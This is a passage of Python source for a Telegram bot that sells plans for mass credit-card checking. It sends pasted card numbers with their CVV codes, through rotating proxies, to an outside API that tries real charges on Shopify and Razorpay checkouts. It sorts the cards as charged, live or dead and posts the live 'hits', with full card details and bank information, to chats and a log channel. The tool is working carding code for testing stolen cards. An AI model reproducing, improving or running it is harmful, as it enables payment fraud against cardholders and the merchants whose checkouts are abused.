                    password_q = quote(password, safe='')
                    return f"http://{user_q}:{password_q}@{host}:{port_str}"
                except ValueError:
                    return None
            elif len(parts) == 2:
                host, port_str = parts
                try:
                    int(port_str)
                    return f"http://{host}:{port_str}"
                except ValueError:
                    return None
            return None

        # Standard URL form with @ — safe to urlparse
        try:
            parsed = urlparse(proxy)
            host = parsed.hostname or ''
            port = parsed.port
            user = parsed.username
            password = parsed.password
            if not host or not port:
                return None
            if user is not None and password is not None:
                user_q = quote(user, safe='')
                password_q = quote(password, safe='')
                return f"http://{user_q}:{password_q}@{host}:{port}"
            return f"http://{host}:{port}"
        except Exception:
            return None

    # Plain ip:port or ip:port:user:pass
    parts = proxy.split(':', 3)
    if len(parts) == 4:
        host, port, user, password = parts
        user_q = quote(user, safe='')
        password_q = quote(password, safe='')
        return f"http://{user_q}:{password_q}@{host}:{port}"
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    return None


def parse_proxy_lines(text: str) -> list[str]:
    """Extract proxies from pasted text or txt files.
    Supports one-per-line plus loose whitespace-separated tokens.
    """
    proxies = []
    for raw_line in (text or '').splitlines():
        line = raw_line.strip()
        if not line:
            continue
        if line.startswith('/addproxy'):
            line = line[len('/addproxy'):].strip()
            if not line:
                continue

        candidates = [line] if '://' in line else line.split()
        for candidate in candidates:
            candidate = candidate.strip().strip(',;')
            if not candidate:
                continue

            normalized = normalize_proxy_input(candidate)
            if not normalized:
                continue

            # Accept only clearly valid proxy shapes
            body = normalized.split('://', 1)[1] if '://' in normalized else normalized
            part_count = len(body.split(':'))
            if part_count in (2, 4):
                proxies.append(normalized)
    return proxies


def proxy_to_api_param(proxy: str) -> str | None:
    """Convert stored proxy formats to the checker API's expected host:port[:user:pass] form."""
    normalized = normalize_proxy_input(proxy)
    if not normalized:
        return None
    return normalized.split('://', 1)[1] if '://' in normalized else normalized


def is_text_reply_file(reply_msg) -> bool:
    if not getattr(reply_msg, 'file', None):
        return False
    fname = (reply_msg.file.name or '').lower()
    mime = (reply_msg.file.mime_type or '').lower()
    return fname.endswith('.txt') or mime == 'text/plain' or mime.startswith('text/') or mime == 'application/octet-stream'

# ─── PLAN / REDEEM CODE HELPERS ─────────────────────────────────────────────

def load_codes():
    if not os.path.exists(CODES_FILE):
        return {}
    try:
        with open(CODES_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def save_codes(codes):
    with open(CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=2)

def load_users_data():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def save_users_data(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def generate_code(plan_key):
    chars = string.ascii_uppercase + string.digits
    codes = load_codes()
    # Retry until unique code found (collision guard)
    for _ in range(10):
        part1 = ''.join(random.choices(chars, k=4))
        part2 = ''.join(random.choices(chars, k=4))
        code = f"{plan_key[:3]}-{part1}-{part2}"
        if code not in codes:
            break
    codes[code] = {
        'plan': plan_key,
        'used': False,
        'used_by': None,
        'used_at': None,
        'created_at': datetime.now().isoformat(),
    }
    save_codes(codes)
    return code

def _clean_redeem_code(raw: str) -> str:
    """
    Aggressively clean a redeem code string to handle all Telegram copy-paste issues.

    Removes:
      - Leading/trailing whitespace
      - Invisible Unicode chars: zero-width space, ZWJ, ZWNJ, LRM, RLM, BOM, word joiner,
        soft hyphen, non-breaking space
      - Normalizes ALL dash variants to a regular ASCII hyphen (-):
          en-dash (–), em-dash (—), non-breaking hyphen, figure dash, horizontal bar,
          minus sign (−)
      - Remaining whitespace (spaces, newlines, tabs)
    """
    import unicodedata
    # 1. Strip outer whitespace
    s = raw.strip()
    # 2. Remove invisible / zero-width chars
    invisible = (
        '\u200b'  # zero-width space
        '\u200c'  # ZWNJ
        '\u200d'  # ZWJ
        '\u200e'  # LRM
        '\u200f'  # RLM
        '\ufeff'  # BOM / ZWNBSP
        '\u2060'  # word joiner
        '\u00ad'  # soft hyphen
    )
    for ch in invisible:
        s = s.replace(ch, '')
    # 3. Normalize all dash variants → ASCII hyphen
    # All dash/separator variants → ASCII hyphen
    dash_variants = (
        '\u2011'  # non-breaking hyphen
        '\u2012'  # figure dash
        '\u2013'  # en-dash
        '\u2014'  # em-dash
        '\u2015'  # horizontal bar
        '\u2212'  # minus sign
    )
    for ch in dash_variants:
        s = s.replace(ch, '-')  # dash variant → ASCII hyphen
    # Non-breaking space: could be separator between code parts, treat as hyphen
    s = s.replace('\u00a0', '-')
    # 4. Remove any remaining whitespace and uppercase
    s = s.replace(' ', '').replace('\n', '').replace('\t', '').upper()
    return s


def redeem_code(user_id, code):
    """Returns ('ok', info) | ('not_found', None) | ('used', None) | ('already_active', None)"""
    codes = load_codes()

    # ── BUG FIX A: Deep-clean code to handle Telegram invisible chars & smart dashes ──
    code = _clean_redeem_code(code)

    if code not in codes:
        return 'not_found', None
    if codes[code]['used']:
        return 'used', None

    plan_key = codes[code]['plan']
    plan = PLANS[plan_key]
    uid = str(user_id)
    users = load_users_data()

    # ── BUG FIX B: Admin redeem protection ────────────────────────────────────────
    # Admin sirf code mark karta hai "used" — users.json mein kuch nahi likhta.
    # Is se admin ka unlimited status kabhi affect nahi hoga.
    if user_id in ADMIN_ID:
        codes[code]['used']    = True
        codes[code]['used_by'] = uid
        codes[code]['used_at'] = datetime.now().isoformat()
        save_codes(codes)
        expires_at = datetime.now() + timedelta(days=plan['days'])
        return 'ok', {'plan_key': plan_key, 'plan': plan, 'expires_at': expires_at}
    # ──────────────────────────────────────────────────────────────────────────────

    # Prevent multiple redeems while plan is active (non-admin users only)
    if uid in users:
        user_data = users[uid]
        current_plan = user_data.get('plan', 'FREE')
        # FREE users can always redeem
        if current_plan != 'FREE':
            try:
                current_expiry = datetime.fromisoformat(user_data.get('expires_at', '2000-01-01'))
                if datetime.now() < current_expiry:
                    return 'already_active', None
            except Exception:
                pass

    # Capture old_plan BEFORE we overwrite users[uid]
    old_plan = users.get(uid, {}).get('plan', 'FREE')

    expires_at = datetime.now() + timedelta(days=plan['days'])

    # Race condition guard: re-read codes to ensure no one redeemed between check and save
    codes = load_codes()
    if codes.get(code, {}).get('used', False):
        return 'used', None

    users[uid] = {
        'plan': plan_key,
        'expires_at': expires_at.isoformat(),
        'cc_used': 0,
        'cc_limit': plan['cc_limit'],
        'redeemed_at': datetime.now().isoformat(),
    }
    save_users_data(users)
    codes[code]['used']    = True
    codes[code]['used_by'] = uid
    codes[code]['used_at'] = datetime.now().isoformat()
    save_codes(codes)

    # Log Plan Upgrade
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(log_plan_upgrade(user_id, "User", old_plan, plan_key))
    except RuntimeError:
        pass

    return 'ok', {'plan_key': plan_key, 'plan': plan, 'expires_at': expires_at}

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    """Admin = always premium. Others need an active plan."""
    if user_id in ADMIN_ID:
        return True
    users = load_users_data()
    uid = str(user_id)
    if uid not in users:
        return False
    try:
        expires_at = datetime.fromisoformat(users[uid]['expires_at'])
        return datetime.now() < expires_at
    except Exception:
        return False

def get_cc_remaining(user_id):
    """Returns per-session CC check limit.
    -1 = unlimited (admin).
    Per-session means: each new /chk or /mrz session gets the full plan limit.
    cc_used tracks lifetime total (shown in /myplan) but does NOT reduce session allowance.
    """
    if user_id in ADMIN_ID:
        return -1
    users = load_users_data()
    uid = str(user_id)
    if uid not in users:
        return 0
    try:
        expires_at = datetime.fromisoformat(users[uid]['expires_at'])
        if datetime.now() >= expires_at:
            return 0
        # Per-session: always return the plan's full limit (not lifetime remaining)
        return users[uid].get('cc_limit', PLANS.get(users[uid].get('plan', 'FREE'), PLANS['FREE'])['cc_limit'])
    except Exception:
        return 0

# ─── BAN SYSTEM ──────────────────────────────────────────────────────────────

def load_banned():
    """Load banned users dict: {uid: {reason, banned_at}}"""
    if not os.path.exists(BANNED_FILE):
        return {}
    try:
        with open(BANNED_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def save_banned(data):
    with open(BANNED_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def is_user_banned(user_id):
    banned = load_banned()
    return str(user_id) in banned

def ban_user(user_id, reason="No reason provided"):
    banned = load_banned()
    banned[str(user_id)] = {
        'reason': reason,
        'banned_at': datetime.now().isoformat()
    }
    save_banned(banned)

def unban_user(user_id):
    banned = load_banned()
    uid = str(user_id)
    if uid in banned:
        del banned[uid]
        save_banned(banned)
        return True
    return False

# ─────────────────────────────────────────────────────────────────────────────

def increment_cc_used(user_id, count=1):
    """Track CC usage for all plans including FREE (needed for per-session limits).
    Admin = skip always.
    """
    if user_id in ADMIN_ID:
        return
    users = load_users_data()
    uid = str(user_id)
    if uid in users:
        users[uid]['cc_used'] = users[uid].get('cc_used', 0) + count
        save_users_data(users)

def assign_free_plan(user_id):
    """Give user the FREE plan only if they have no existing active plan."""
    if user_id in ADMIN_ID:
        return
    users = load_users_data()
    uid = str(user_id)
    existing = users.get(uid)
    if existing:
        try:
            exp = datetime.fromisoformat(existing['expires_at'])
            if datetime.now() < exp:
                return  # active plan exists — never overwrite
        except Exception:
            return  # can't parse expiry → keep existing data safe, don't overwrite
    plan = PLANS['FREE']
    users[uid] = {
        'plan': 'FREE',
        'expires_at': (datetime.now() + timedelta(days=plan['days'])).isoformat(),
        'cc_used': 0,
        'cc_limit': plan['cc_limit'],
        'redeemed_at': datetime.now().isoformat(),
    }
    save_users_data(users)

def can_check(user_id, is_private=True):
    """
    Returns a status string:
      'ok'         – allowed
      'banned'     – user is banned by admin
      'no_plan'    – no plan assigned at all
      'expired'    – plan expired
      'group_only' – FREE plan, must use group
    """
    if user_id in ADMIN_ID:
        return 'ok'
    # Ban check — before everything else
    if is_user_banned(user_id):
        return 'banned'
    users = load_users_data()
    uid = str(user_id)
    if uid not in users:
        return 'no_plan'
    data = users[uid]
    plan_key = data.get('plan', 'FREE')
    plan = PLANS.get(plan_key, PLANS['FREE'])
    try:
        if datetime.now() >= datetime.fromisoformat(data['expires_at']):
            return 'expired'
    except Exception:
        return 'expired'
    if plan.get('group_only', False) and is_private:
        return 'group_only'
    # Note: CC limits are now enforced per-session inside /chk and /mrz
    # (not cumulative/lifetime). This applies to ALL plans including paid.
    return 'ok'

def is_site_dead(response_msg, gateway, price):
    """Check if site response indicates a dead site.
    With new API, status classification is done server-side.
    This is a fallback check for edge cases."""
    if not response_msg:
        return True
    if not gateway or gateway.upper() in ("UNKNOWN", ""):
        return True
    # Don't treat missing price as dead — new API may return '-' for valid responses
    # Price check only for '$0' or literal zero amounts
    price_str = str(price).strip()
    if price_str in ("$0", "$0.0", "$0.00", "0", "0.0", "0.00"):
        return True
    return False

def is_site_dead_for_test(response_msg, gateway):
    """
    FIX #1 — Relaxed check used ONLY for test_site().
    Price is intentionally NOT checked here: many valid Shopify stores return
    price='-' when the checker API can't resolve a product, but the gateway
    is real and the site IS alive for CC checking purposes.
    """
    if not response_msg:
        return True
    # FIX: case-insensitive check for Unknown/UNKNOWN/unknown
    if not gateway or gateway.upper() in ("UNKNOWN", ""):
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        session = _shared_http_session()
        async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=timeout) as res:
            if res.status != 200:
                return 'BIN Info Not Found', '-', '-', '-', '-', ''
            response_text = await res.text()
            try:
                data = json.loads(response_text)
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                return brand, bin_type, level, bank, country, flag
            except json.JSONDecodeError:
                return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    # Accept month as 1 or 2 digits (e.g. both 1 and 01 for January)
    pattern = r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        month = month.zfill(2)   # pad to 2 digits: 1 → 01
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards


# ── Soft-decline / APPROVED response set (used in check_card classification) ──
# These responses mean the card is LIVE but NOT charged.
# They MUST take priority over Status="true" — the API may return Status=true
# when a 3DS/OTP challenge is initiated, but the payment was never completed.
_APPROVED_RESPONSES = frozenset({
    'INSUFFICIENT_FUNDS', 'INSUFFICIENT_FUND', 'INCORRECT_ZIP',
    'INVALID_CVC', 'INCORRECT_CVC', 'INVALID_CVV', 'INCORRECT_CVV',
    'BAD_CVV', 'CVV_FAIL', '3DS_REQUIRED', 'OTP_REQUIRED', 'OTP REQUIRED',
    'CARD_APPROVED', 'AUTHENTICATION_REQUIRED',
})
_APPROVED_SUBSTRINGS = ('3DS_REQUIRED', 'OTP_REQUIRED', 'OTP REQUIRED', 'AUTHENTICATION')

async def check_card(card, site, proxy, lane="mass", uid="anonymous"):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Dead', 'message': 'Invalid card format', 'card': card, 'gateway': '-', 'price': '-'}

        if not site.startswith('http'):
            site = f'https://{site}'

        proxy_str = proxy_to_api_param(proxy) if proxy else None

        # ── New API format: ?cc=...&site=...&proxy=... (autosh.up.railway.app) ──
        url = f'{CHECKER_API_URL}?cc={quote(card, safe="|:")}&site={quote(site, safe="://?=&@")}'
        if proxy_str:
            url += f'&proxy={quote(proxy_str, safe=":@")}'

        timeout = aiohttp.ClientTimeout(total=190)
        _sess = _shared_http_session()
        async with _sess.get(url, timeout=timeout) as resp:
            if resp.status != 200:
                try:
                    err_text = await resp.text()
                    err_body = err_text[:120].strip()
                except Exception:
                    err_body = ''
                should_retry = resp.status not in (400, 404)
                if resp.status == 404:
                    err_body = 'API URL wrong — update CHECKER_API_URL in config'
                return {
                    'status': 'Site Error',
                    'message': f'HTTP {resp.status}: {err_body}' if err_body else f'HTTP {resp.status}',
                    'card': card,
                    'retry': should_retry,
                    'gateway': 'Unknown',
                    'price': '-'
                }

            try:
                raw = await resp.json()
            except Exception:
                text = await resp.text()
                return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True, 'gateway': 'Unknown', 'price': '-'}

        # ── Handle API-level errors ({"error": "..."} or {"Error": "..."}) ──
        _err_val = raw.get('error', raw.get('Error', None))
        if _err_val and 'Status' not in raw and 'status' not in raw:
            err_msg = str(_err_val)
            should_retry = 'key' not in err_msg.lower()
            return {'status': 'Site Error', 'message': err_msg, 'card': card, 'retry': should_retry, 'gateway': 'Unknown', 'price': '-'}

        # ── New API Response Parsing ──
        # API returns capitalized keys: {Status, Response, Price, Gateway, CC}
        # Status = "true" (charged) or "false" (declined/approved)
        # Response = "CARD_DECLINED", "ORDER_PLACED", "INSUFFICIENT_FUNDS" etc.
        _raw_status  = str(raw.get('Status',  raw.get('status',  ''))).strip()
        response_msg = raw.get('Response', raw.get('message', ''))
        price        = raw.get('Price',    raw.get('price',   'N/A'))
        gateway      = raw.get('Gateway',  raw.get('gateway', 'Shopify Payments'))

        # Normalize Status ("true"/"false") + Response → internal api_status
        # ──────────────────────────────────────────────────────────────────────
        # BUG FIX: APPROVED response keywords MUST be checked FIRST, BEFORE
        # Status="true". The Shopify/Stripe API sometimes returns Status="true"
        # with Response="3DS_REQUIRED" or "OTP_REQUIRED" because it considers
        # the payment INITIATED — but the card was NEVER actually charged.
        # 3DS/OTP means the bank requires additional authentication that was
        # never completed → card is live (APPROVED), NOT charged.
        # ──────────────────────────────────────────────────────────────────────
        _resp_up = str(response_msg).strip().upper()

        # STEP 1: APPROVED soft-decline responses — highest priority, override Status="true"
        # (Sets defined at module level as _APPROVED_RESPONSES / _APPROVED_SUBSTRINGS for perf)
        if _resp_up in _APPROVED_RESPONSES or any(sub in _resp_up for sub in _APPROVED_SUBSTRINGS):
            # Card is live but NOT charged — 3DS/OTP/CVV soft-decline
            api_status = 'APPROVED'

        # STEP 2: CHARGED — only if response is a genuine success (not soft-decline)
        elif _raw_status.lower() == 'true' or _resp_up in ('ORDER_PLACED', 'CARD_CHARGED', 'ORDER_PAID', 'CHARGED'):
            api_status = 'CHARGED'

        # STEP 3: DECLINED
        elif _raw_status.lower() == 'false' or _resp_up in (
            'CARD_DECLINED', 'DO_NOT_HONOR', 'FRAUD', 'FRAUDULENT',
            'EXPIRED_CARD', 'STOLEN_CARD', 'LOST_CARD', 'INCORRECT_NUMBER',
            'CARD_INCORRECT', 'RESTRICTED_CARD', 'SECURITY_VIOLATION',
            'BLOCKED', 'PICKUP_CARD', 'CARD_VELOCITY_EXCEEDED',
            'PROCESSING_ERROR', 'CALL_ISSUER', 'TRY_AGAIN_LATER',
            'TRANSACTION_NOT_ALLOWED', 'MISMATCHED_BILL',
        ) or 'DECLINED' in _resp_up or 'FRAUD' in _resp_up:
            api_status = 'DECLINED'

        elif _resp_up in ('', 'UNKNOWN'):
            api_status = 'DECLINED'

        else:
            api_status = 'DECLINED'  # Safe default for unknown responses

        # Normalize price
        if price is None or str(price).strip() in ('', 'None', 'null', 'N/A'):
            price = '-'
        else:
            try:
                pval = float(str(price).replace('$', '').replace(',', ''))
                price = f"${pval:.2f}" if pval > 0 else '-'
            except (ValueError, TypeError):
                price = str(price)

        # ── DEAD KEYWORD CHECK ──
        if _is_dead_keyword(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        # Proxy-related errors = retry
        proxy_error = any(k in str(response_msg).lower() for k in ['proxy', 'tunnel', 'connect failed', 'connection error', 'socks'])
        if proxy_error:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        # ── Map API status directly (API already classifies) ──
        response_msg = _display_message(response_msg)

        if api_status in ('CHARGED', 'ORDER_PAID'):
            return {'status': 'Charged',  'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        elif api_status == 'APPROVED':
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        elif api_status == 'DECLINED':
            return {'status': 'Declined', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        else:
            # FIX #2: Removed unreachable `elif api_status == 'ERROR'` dead code branch.
            # api_status is only ever set to CHARGED/APPROVED/DECLINED above — ERROR is never assigned.
            return {'status': 'Dead',     'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True, 'gateway': 'Unknown', 'price': '-'}
    except Exception as e:
        error_msg = str(e)
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

# FIX #4 — fixed inconsistent indentation on the proxies return
async def check_card_with_retry(card, sites, proxies, max_retries=2, lane="mass", uid="anonymous"):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy, lane=lane, uid=uid)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        # FIX: preserve gateway/price from last_result; avoid double-wrapping message
        raw_msg = last_result.get("message", "Max retries exceeded")
        # If message already contains 'Site errors:' don't wrap again
        display_msg = raw_msg if raw_msg.startswith('Site errors:') else f'Site errors: {raw_msg}'
        return {
            'status': 'Dead',
            'message': display_msg,
            'card': card,
            'gateway': last_result.get('gateway', 'Unknown'),
            'price': last_result.get('price', '-'),
            'site': 'Multiple'
        }

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}


# ─── RAZORPAY CHECKER ────────────────────────────────────────────────────────

async def check_razorpay(card, proxy=None):
    try:
        proxy_str = proxy_to_api_param(proxy) if proxy else None

        url = f'{RAZORPAY_API_URL}?cc={quote(card, safe="|:")}&url={quote(RAZORPAY_MERCHANT_URL, safe="://?=&@#")}&amount=1'
        if proxy_str:
            url += f'&proxy={quote(proxy_str, safe="")}'

        timeout = aiohttp.ClientTimeout(total=190)  # API can take up to 180s (Shopify checkout)
        _sess = _shared_http_session()
        async with _sess.get(url, timeout=timeout) as resp:
            if resp.status != 200:
                return {'status': 'Dead', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True, 'gateway': 'Razorpay', 'price': '-'}
            try:
                raw = await resp.json()
            except Exception:
                text = await resp.text()
                raw = {'Response': text, 'Status': 'UNKNOWN'}


        # Handle API-level errors
        if isinstance(raw, dict) and 'error' in raw:
            return {'status': 'Dead', 'message': str(raw['error']), 'card': card, 'retry': True, 'gateway': 'Razorpay', 'price': '-'}

        # ── Razorpay response parsing ─────────────────────────────────────────
        api_status   = str(raw.get('Status', '')).upper()
        response_msg = raw.get('Response', '')
        response_low = response_msg.lower()
        amount       = raw.get('Amount', '₹1')
        _rmsg        = str(response_msg).upper().strip()

        # ── DEAD KEYWORD CHECK ────────────────────────────────────────────────
        if _is_dead_keyword(response_msg):
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'retry': True, 'gateway': 'Razorpay', 'price': amount}

        # ── CHARGED ───────────────────────────────────────────────────────────
        is_charged = (
            'CHARGED' in api_status or
            _rmsg in ('ORDER_PLACED', 'CHARGED', 'CARD_CHARGED', 'ORDER_PAID') or
            'transaction success' in response_low
        )

        # ── APPROVED — card valid, not charged ────────────────────────────────
        _rp_approved_exact = {
            'INCORRECT_ZIP',
            'INSUFFICIENT_FUNDS', 'INSUFFICIENT_FUND',
            '3DS_REQUIRED', 'OTP_REQUIRED',
            'INCORRECT_CVC', 'INVALID_CVC',
            'INCORRECT_CVV', 'INVALID_CVV', 'BAD_CVV', 'CVV_FAIL',
            'AUTHENTICATION_REQUIRED',  # FIX: same as 3DS — card is live, not charged
        }
        is_approved = (
            _rmsg in _rp_approved_exact or
            '3DS_REQUIRED' in _rmsg or
            'OTP_REQUIRED' in _rmsg or
            'OTP REQUIRED' in _rmsg or
            'AUTHENTICATION' in _rmsg  # FIX: catch AUTHENTICATION_REQUIRED variants
        )

        # ── DECLINED ──────────────────────────────────────────────────────────
        _rp_declined_exact = {
            'CARD_DECLINED', 'FRAUD', 'DO_NOT_HONOR', 'INCORRECT_NUMBER',
            'WRONG_NUMBER', 'CARD_INCORRECT', 'EXPIRED_CARD', 'PICKUP_CARD',
            'RESTRICTED_CARD', 'STOLEN_CARD', 'LOST_CARD',
            'CARD_VELOCITY_EXCEEDED', 'TRANSACTION_NOT_ALLOWED', 'INVALID_EXPIRY',
            'PROCESSING_ERROR', 'CALL_ISSUER', 'TRY_AGAIN_LATER', 'FRAUDULENT',
            'SECURITY_VIOLATION', 'BLOCKED', 'AUTHENTICATION_REQUIRED',
            'MISMATCHED_BILL', 'DECLINED',
        }
        is_declined = (
            _rmsg in _rp_declined_exact or
            'DECLINED' in _rmsg or
            'DO_NOT_HONOR' in _rmsg or
            'FRAUD' in _rmsg
        )

        # BUG FIX (Razorpay): APPROVED soft-declines take priority over is_charged.
        # 3DS_REQUIRED / OTP_REQUIRED must always be APPROVED, never CHARGED.
        if is_approved:
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': 'Razorpay', 'price': amount}
        elif is_charged:
            return {'status': 'Charged',  'message': 'ORDER_PLACED', 'card': card, 'gateway': 'Razorpay', 'price': amount}
        elif is_declined:
            return {'status': 'Declined', 'message': response_msg, 'card': card, 'gateway': 'Razorpay', 'price': amount}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'gateway': 'Razorpay', 'price': amount}

    except asyncio.TimeoutError:
        return {'status': 'Dead', 'message': 'Timeout', 'card': card, 'retry': True, 'gateway': 'Razorpay', 'price': '-'}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'retry': True, 'gateway': 'Razorpay', 'price': '-'}  # FIX #3: added missing gateway/price keys


async def check_razorpay_with_retry(card, proxies, max_retries=2):
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
    last_result = None
    for attempt in range(max_retries):
        proxy = random.choice(proxies)
        result = await check_razorpay(card, proxy)
        if not result.get('retry'):
            return result
        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)
    return last_result or {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

async def send_realtime_hit(chat_id, result, hit_type, username):
    """Sends live hit to the same chat where /chk was triggered (group or private)."""
    if hit_type == "Charged":
        header = "💎 LIVE HIT — CHARGED"
    else:
        header = "✅ LIVE HIT — APPROVED"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])

    message = (
        f"<b>{header}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <code>{result['card']}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛒 <b>Gateway</b>  {result.get('gateway', 'Unknown')}\n"
        f"📝 <b>Response</b> {_display_message(result['message'])}\n"
        f"💸 <b>Price</b>    {result.get('price', '-')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 {brand} · {bin_type} · {level}\n"
        f"🏦 {bank}\n"
        f"🌍 {country} {flag}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

    try:
        await bot.send_message(chat_id, premium_emoji(message), parse_mode='html')
    except Exception:
        pass


# ================== NEW FEATURE: HIT LOGS ==================
async def log_plan_upgrade(user_id, username, old_plan, new_plan, method="Redeem Code"):
    """Sends beautiful Plan Upgrade log to HIT_LOG_CHANNEL"""
    if not HIT_LOG_CHANNEL:
        return

    try:
        plan_data = PLANS.get(new_plan, {})
        emoji = plan_data.get('emoji', '💎')
        days = plan_data.get('days', 0)
    except Exception:
        emoji = '💎'
        days = 0

    log_text = (
        f"🎉━━━━━━━━━━━━━━━━━━━━━━🎉\n"
        f"     ✨ <b>PLAN UPGRADED</b> ✨\n"
        f"🎉━━━━━━━━━━━━━━━━━━━━━━🎉\n\n"
        f"👤 <b>User</b>       : <code>{user_id}</code> (@{username})\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 <b>Plan</b>       : {old_plan} → {emoji} <b>{new_plan}</b>\n"
        f"📅 <b>Validity</b>   : {days} Days\n"
        f"💳 <b>Method</b>     : {method}\n"
        f"🕒 <b>Time</b>       : {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎊 Congratulations on your upgrade! 🎊"
    )

    try:
        await bot.send_message(HIT_LOG_CHANNEL, premium_emoji(log_text), parse_mode='html')
    except Exception as e:
        print(f"[Plan Upgrade Log Error] {e}")


async def log_hit_to_channel(result, hit_type, user_id, username, check_type="Mass Check"):
    """Sends beautiful hit log to the specified HIT_LOG_CHANNEL"""
    if not HIT_LOG_CHANNEL:
        return

    # Auto fetch plan name
    plan_name = "Unknown"
    try:
        users = load_users_data()
        user_data = users.get(str(user_id), {})
        plan_key = user_data.get('plan', 'FREE')
        plan = PLANS.get(plan_key, {})
        plan_name = f"{plan.get('emoji', '💎')} {plan_key}"
    except Exception:
        pass

    if hit_type == "Charged":
        emoji = "💎"
    else:
        emoji = "✅"

    log_message = (
        f"{emoji} <b>HIT DETECTED</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User</b>       : <code>{user_id}</code> (@{username})\n"
        f"💎 <b>Plan</b>       : {plan_name}\n"
        f"🔧 <b>Check Type</b> : {check_type}\n"
        f"🕒 <b>Time</b>       : {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛒 <b>Gateway</b>    : {result.get('gateway', 'Unknown')}\n"
        f"📝 <b>Response</b>   : {_display_message(result['message'])}\n"
        f"💸 <b>Price</b>      : {result.get('price', '-')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

    try:
        await bot.send_message(HIT_LOG_CHANNEL, premium_emoji(log_message), parse_mode='html')
    except Exception as e:
        print(f"[Hit Log Error] {e}")


async def update_progress(chat_id, user_id, message_id, results, current_attempt_count):
    """Updates progress message in the same chat where /chk was triggered."""
    total = results.get('total', 0)
    checked = len(results['charged']) + len(results['approved']) + len(results['dead'])

    last_card     = results.get('last_card', 'Waiting...')
    last_price    = results.get('last_price', '-')
    last_response = _display_message(results.get('last_response', 'Waiting...'))

    # Session remaining = how many cards are left in THIS session
    session_remaining = total - checked

    # Progress bar + elapsed time + ETA
    bar = make_progress_bar(checked, total)
    elapsed = time.time() - results.get('start_time', time.time())
    elapsed_str = f"{int(elapsed//60)}m {int(elapsed%60)}s"
    if checked > 0 and elapsed > 0:
        eta_secs = (elapsed / checked) * (total - checked)
        eta_str = f"{int(eta_secs//60)}m {int(eta_secs%60)}s"
    else:
        eta_str = "calculating..."
    speed = f"{checked/max(elapsed,1):.1f} cards/s"

    progress_text = (
        f"🔄 <b>Checking Progress...</b>\n\n"
        f"💳 <b>Card</b>     » <code>{last_card}</code>\n"
        f"📝 <b>Response</b> » {last_response}\n"
        f"💰 <b>Price</b>    » {last_price}\n\n"
        f"✅ <b>Charged</b>  » {len(results['charged'])}\n"
